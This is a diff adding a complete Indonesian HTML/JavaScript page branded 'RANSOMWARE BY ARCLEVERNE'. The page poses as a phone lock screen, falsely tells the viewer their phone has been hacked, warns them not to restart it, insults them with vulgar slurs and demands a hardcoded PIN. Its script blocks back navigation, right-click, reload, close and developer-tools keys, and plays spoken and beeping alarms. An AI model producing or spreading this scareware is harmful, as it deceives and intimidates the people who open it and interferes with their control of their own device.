@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title> RANSOMWARE BY ARCLEVERNE
+HP LU KENA SADAP TOLOL BEGO DONGO TOLOL MEMEK ASU MAK LU KE ANJ 😹😂</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+
+@keyframes pulse{
+  0%,100%{opacity:1;transform:scale(1)}
+  50%{opacity:.7;transform:scale(1.05)}
+}
+@keyframes shake{
+  0%,100%{transform:translateX(0)}
+  20%,60%{transform:translateX(-8px)}
+  40%,80%{transform:translateX(8px)}
+}
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(10px)}
+  to{opacity:1;transform:translateY(0)}
+}
+@keyframes speakPulse{
+  0%,100%{box-shadow:0 0 20px rgba(255,0,51,.3)}
+  50%{box-shadow:0 0 40px rgba(255,0,51,.6)}
+}
+@keyframes redGlow{
+  0%,100%{box-shadow:0 0 20px rgba(255,0,51,.4),0 0 40px rgba(255,0,51,.2)}
+  50%{box-shadow:0 0 30px rgba(255,0,51,.7),0 0 60px rgba(255,0,51,.4)}
+}
+
+html,body{
+  width:100%;
+  height:100%;
+  overflow:hidden;
+}
+
+body{
+  background:#000;
+  color:#fff;
+  font-family:'Segoe UI',Arial,sans-serif;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  position:relative;
+}
+
+body::before{
+  content:'';
+  position:fixed;
+  inset:0;
+  background:radial-gradient(ellipse at center,rgba(80,0,15,.4) 0%,#000 70%);
+  pointer-events:none;
+  z-index:0;
+}
+
+/* ═══ SPEAKING INDICATOR ═══ */
+.speaking-indicator{
+  position:fixed;
+  top:30px;
+  left:50%;
+  transform:translateX(-50%);
+  z-index:100;
+  background:rgba(255,0,51,.1);
+  border:1px solid rgba(255,0,51,.4);
+  border-radius:30px;
+  padding:8px 18px;
+  display:none;
+  align-items:center;
+  gap:10px;
+  font-size:11px;
+  color:#ff0033;
+  letter-spacing:2px;
+  font-weight:bold;
+  text-transform:uppercase;
+  animation:speakPulse 1s infinite;
+  backdrop-filter:blur(10px);
+}
+.speaking-indicator.show{display:flex}
+
+.speak-bars{
+  display:flex;
+  gap:2px;
+  align-items:center;
+  height:14px;
+}
+.speak-bars span{
+  width:3px;
+  background:#ff0033;
+  border-radius:2px;
+  animation:speakBar .5s infinite alternate;
+}
+.speak-bars span:nth-child(1){height:40%;animation-delay:0s}
+.speak-bars span:nth-child(2){height:80%;animation-delay:.1s}
+.speak-bars span:nth-child(3){height:100%;animation-delay:.2s}
+.speak-bars span:nth-child(4){height:60%;animation-delay:.15s}
+.speak-bars span:nth-child(5){height:30%;animation-delay:.25s}
+
+@keyframes speakBar{
+  from{height:20%}
+  to{height:100%}
+}
+
+/* ═══ CONTENT ═══ */
+.lock-content{
+  position:relative;
+  z-index:10;
+  width:100%;
+  max-width:400px;
+  text-align:center;
+  animation:fadeIn .6s ease;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+  padding:40px 0;
+}
+
+.lock-icon{
+  font-size:clamp(60px,20vw,90px);
+  line-height:1;
+  margin-bottom:clamp(20px,5vw,35px);
+  color:#ff0033;
+  animation:pulse 2.5s infinite;
+  filter:drop-shadow(0 4px 30px rgba(255,0,51,.6));
+}
+
+.title{
+  font-size:clamp(16px,5vw,22px);
+  font-weight:800;
+  letter-spacing:3px;
+  margin-bottom:clamp(40px,10vw,60px);
+  color:#ff0033;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  text-transform:uppercase;
+  text-shadow:0 0 20px rgba(255,0,51,.8),0 0 40px rgba(255,0,51,.4);
+  animation:pulse 2s infinite;
+}
+.title .emoji{
+  font-size:clamp(20px,5.5vw,26px);
+}
+
+.pin-label{
+  font-size:clamp(12px,3.5vw,14px);
+  font-weight:700;
+  letter-spacing:4px;
+  margin-bottom:clamp(15px,4vw,22px);
+  color:#ff6677;
+  text-transform:uppercase;
+  text-shadow:0 0 10px rgba(255,0,51,.5);
+}
+
+.pin-input{
+  width:clamp(200px,70vw,280px);
+  padding:clamp(14px,4vw,18px) clamp(15px,4vw,20px);
+  background:rgba(255,0,51,.08);
+  border:2px solid rgba(255,0,51,.4);
+  border-radius:4px;
+  color:#ff0033;
+  font-size:clamp(18px,5vw,22px);
+  font-weight:700;
+  text-align:center;
+  letter-spacing:clamp(6px,2.5vw,10px);
+  outline:none;
+  transition:all .3s;
+  margin-bottom:clamp(25px,6vw,35px);
+  font-family:monospace;
+  box-shadow:0 0 15px rgba(255,0,51,.3) inset;
+}
+.pin-input::placeholder{
+  color:rgba(255,0,51,.4);
+  letter-spacing:4px;
+  font-size:clamp(12px,3.5vw,14px);
+}
+.pin-input:focus{
+  border-color:#ff0033;
+  background:rgba(255,0,51,.15);
+  box-shadow:0 0 25px rgba(255,0,51,.6),0 0 15px rgba(255,0,51,.3) inset;
+}
+.pin-input.error{
+  border-color:#ff0033;
+  animation:shake .4s;
+  background:rgba(255,0,51,.3);
+}
+
+.developer{
+  font-size:clamp(10px,2.8vw,12px);
+  color:#ff3344;
+  letter-spacing:1px;
+  margin-bottom:clamp(30px,8vw,50px);
+  font-style:italic;
+  text-shadow:0 0 10px rgba(255,0,51,.4);
+}
+
+.error-msg{
+  min-height:20px;
+  color:#ff0033;
+  font-size:clamp(11px,3vw,13px);
+  font-weight:700;
+  letter-spacing:1.5px;
+  margin-bottom:10px;
+  text-transform:uppercase;
+  text-shadow:0 0 10px rgba(255,0,51,.6);
+}
+
+.warning{
+  position:absolute;
+  bottom:clamp(30px,8vw,50px);
+  left:50%;
+  transform:translateX(-50%);
+  width:100%;
+  text-align:center;
+  padding:0 20px;
+  font-size:clamp(9px,2.5vw,11px);
+  color:#aa3344;
+  letter-spacing:1px;
+  font-style:italic;
+  z-index:10;
+  text-shadow:0 0 10px rgba(255,0,51,.4);
+}
+
+/* Red glow wrapper */
+.lock-content::before{
+  content:'';
+  position:absolute;
+  inset:-20px;
+  background:radial-gradient(ellipse at center,rgba(255,0,51,.15) 0%,transparent 60%);
+  pointer-events:none;
+  z-index:-1;
+  animation:redGlow 3s infinite;
+}
+
+.unlocked{
+  display:none;
+  position:relative;
+  z-index:10;
+  text-align:center;
+  animation:fadeIn .5s ease;
+}
+.unlocked.show{display:block}
+.unlocked .big-ok{
+  font-size:clamp(70px,20vw,100px);
+  margin-bottom:20px;
+  filter:drop-shadow(0 0 30px #00e5a0);
+}
+.unlocked .ok-title{
+  font-size:clamp(18px,5vw,24px);
+  font-weight:700;
+  color:#00e5a0;
+  letter-spacing:3px;
+  margin-bottom:10px;
+  text-transform:uppercase;
+}
+.unlocked .ok-sub{
+  font-size:clamp(11px,3vw,13px);
+  color:#888;
+  letter-spacing:2px;
+}
+</style>
+</head>
+<body>
+
+<!-- ═══ SPEAKING INDICATOR ═══ -->
+<div class="speaking-indicator" id="speakInd">
+  <div class="speak-bars">
+    <span></span><span></span><span></span><span></span><span></span>
+  </div>
+  <span id="speakText">SPEAKING</span>
+</div>
+
+<!-- ═══ LOCK SCREEN ═══ -->
+<div class="lock-content" id="lockContent">
+  
+  <div class="lock-icon"></div>
+  
+  <div class="title">
+    RANSOMWARE BY ARCLEVERNE
+HP LU KENA SADAP TOLOL BEGO DONGO TOLOL MEMEK ASU MAK LU KE ANJ JAN NGAREP AMAN INI ARCLEVERNE BOS😂😂😹😹
+  </div>
+  
+  <div class="pin-label">MASUKKAN PIN</div>
+  
+  <input type="password" 
+         class="pin-input" 
+         id="pinInput" 
+         placeholder="* * * *" 
+         maxlength="10"
+         inputmode="numeric"
+         autocomplete="off">
+  
+  <div class="developer">developer by arcleverne</div>
+  
+  <div class="error-msg" id="errorMsg"></div>
+  
+</div>
+
+<!-- ═══ WARNING ═══ -->
+<div class="warning" id="warning">
+  Jangan mencoba merestart hp anda
+</div>
+
+<!-- ═══ UNLOCKED ═══ -->
+<div class="unlocked" id="unlockedBox">
+  <div class="big-ok">✅</div>
+  <div class="ok-title">UNLOCKED</div>
+  <div class="ok-sub">Hp anda telah terbuka</div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════
+// 🔑 KONFIGURASI
+// ═══════════════════════════════════════════════
+const PIN = "1234";
+
+// Text AI yang bakal diucapin
+const SPEAK_TEXT = "ARCLEVERNE SISTEM";
+const SPEAK_ON_ERROR = "ARCLEVERNE SISTEM. PIN SALAH";
+const SPEAK_ON_SUCCESS = "ARCLEVERNE SISTEM. AKSES DIBERIKAN";
+
+// Setting suara
+const SPEECH_RATE = 0.85;
+const SPEECH_PITCH = 0.6;
+const SPEECH_VOLUME = 1.0;
+
+// ═══════════════════════════════════════════════
+// 🔊 TEXT-TO-SPEECH ENGINE
+// ═══════════════════════════════════════════════
+let selectedVoice = null;
+
+function loadVoices() {
+  if (!('speechSynthesis' in window)) return;
+  const voices = speechSynthesis.getVoices();
+  if (voices.length === 0) return;
+  
+  selectedVoice = voices.find(v => v.lang.startsWith('id')) ||
+                  voices.find(v => v.lang.startsWith('en') && v.name.toLowerCase().includes('male')) ||
+                  voices.find(v => v.lang.startsWith('en-US')) ||
+                  voices[0];
+}
+
+if ('speechSynthesis' in window) {
+  loadVoices();
+  speechSynthesis.onvoiceschanged = loadVoices;
+}
+
+function speak(text, onEnd) {
+  if (!('speechSynthesis' in window)) {
+    if (onEnd) onEnd();
+    return;
+  }
+  
+  speechSynthesis.cancel();
+  
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.rate = SPEECH_RATE;
+  utter.pitch = SPEECH_PITCH;
+  utter.volume = SPEECH_VOLUME;
+  utter.lang = 'id-ID';
+  
+  if (selectedVoice) utter.voice = selectedVoice;
+  
+  showSpeakingIndicator(text);
+  
+  utter.onend = () => {
+    hideSpeakingIndicator();
+    if (onEnd) onEnd();
+  };
+  
+  utter.onerror = () => {
+    hideSpeakingIndicator();
+    if (onEnd) onEnd();
+  };
+  
+  speechSynthesis.speak(utter);
+}
+
+function showSpeakingIndicator(text) {
+  const ind = document.getElementById('speakInd');
+  const txt = document.getElementById('speakText');
+  if (ind && txt) {
+    txt.textContent = text.length > 20 ? 'AI SPEAKING...' : text;
+    ind.classList.add('show');
+  }
+}
+
+function hideSpeakingIndicator() {
+  const ind = document.getElementById('speakInd');
+  if (ind) ind.classList.remove('show');
+}
+
+// ═══════════════════════════════════════════════
+// BEEP
+// ═══════════════════════════════════════════════
+function beep(freq, dur = 0.15, type = 'square', vol = 0.05) {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.frequency.value = freq;
+    osc.type = type;
+    gain.gain.value = vol;
+    osc.start();
+    setTimeout(() => { osc.stop(); ctx.close(); }, dur * 1000);
+  } catch(e) {}
+}
+
+// ═══════════════════════════════════════════════
+// PIN CHECK
+// ═══════════════════════════════════════════════
+const pinInput = document.getElementById('pinInput');
+const errorMsg = document.getElementById('errorMsg');
+const lockContent = document.getElementById('lockContent');
+const warning = document.getElementById('warning');
+const unlockedBox = document.getElementById('unlockedBox');
+
+let attempts = 0;
+let isUnlocked = false;
+
+function checkPin() {
+  if (isUnlocked) return;
+  const input = pinInput.value.trim();
+  
+  if (input === PIN) {
+    // ✅ BENAR
+    isUnlocked = true;
+    errorMsg.textContent = '';
+    
+    beep(800, 0.15, 'square', 0.05);
+    setTimeout(() => beep(1000, 0.15, 'square', 0.05), 150);
+    setTimeout(() => beep(1200, 0.25, 'square', 0.05), 300);
+    
+    speak(SPEAK_ON_SUCCESS, () => {
+      setTimeout(() => {
+        lockContent.style.transition = 'opacity .5s';
+        lockContent.style.opacity = '0';
+        warning.style.transition = 'opacity .5s';
+        warning.style.opacity = '0';
+        
+        setTimeout(() => {
+          lockContent.style.display = 'none';
+          warning.style.display = 'none';
+          unlockedBox.classList.add('show');
+        }, 600);
+      }, 300);
+    });
+    
+  } else {
+    // ❌ SALAH
+    attempts++;
+    errorMsg.textContent = `PIN SALAH! (${attempts}x)`;
+    
+    pinInput.classList.add('error');
+    setTimeout(() => pinInput.classList.remove('error'), 400);
+    pinInput.value = '';
+    
+    beep(150, 0.2, 'sawtooth', 0.08);
+    setTimeout(() => beep(120, 0.3, 'sawtooth', 0.08), 150);
+    
+    speak(SPEAK_ON_ERROR);
+  }
+}
+
+pinInput.addEventListener('input', () => {
+  if (pinInput.value.length === PIN.length) {
+    checkPin();
+  }
+});
+
+pinInput.addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') checkPin();
+});
+
+// ═══ FIRST INTERACTION ═══
+let firstInteraction = false;
+function onFirstInteraction() {
+  if (firstInteraction) return;
+  firstInteraction = true;
+  
+  setTimeout(() => {
+    speak(SPEAK_TEXT, () => {
+      pinInput.focus();
+    });
+  }, 500);
+}
+
+document.addEventListener('click', onFirstInteraction, { once: true });
+document.addEventListener('touchstart', onFirstInteraction, { once: true });
+document.addEventListener('keydown', onFirstInteraction, { once: true });
+
+// ═══ AUTO FOCUS ═══
+window.addEventListener('load', () => {
+  setTimeout(() => pinInput.focus(), 100);
+});
+
+document.addEventListener('click', (e) => {
+  if (e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') {
+    pinInput.focus();
+  }
+});
+
+// ═══ BLOCK ═══
+history.pushState(null, null, location.href);
+window.onpopstate = function() { history.go(1); };
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'w') || e.key === 'F12') {
+    e.preventDefault();
+  }
+});
+
+// ═══ HINT KLIK ═══
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    if (!firstInteraction) {
+      errorMsg.style.color = '#ff0033';
+      errorMsg.textContent = ' PEGEN KE BUKA YA KASIAN LU AJG😹😹😂😂😂';
+      setTimeout(() => {
+        if (!firstInteraction) errorMsg.textContent = '';
+      }, 3000);
+    }
+  }, 1000);
+});
+</script>
+
+</body>
+</html>
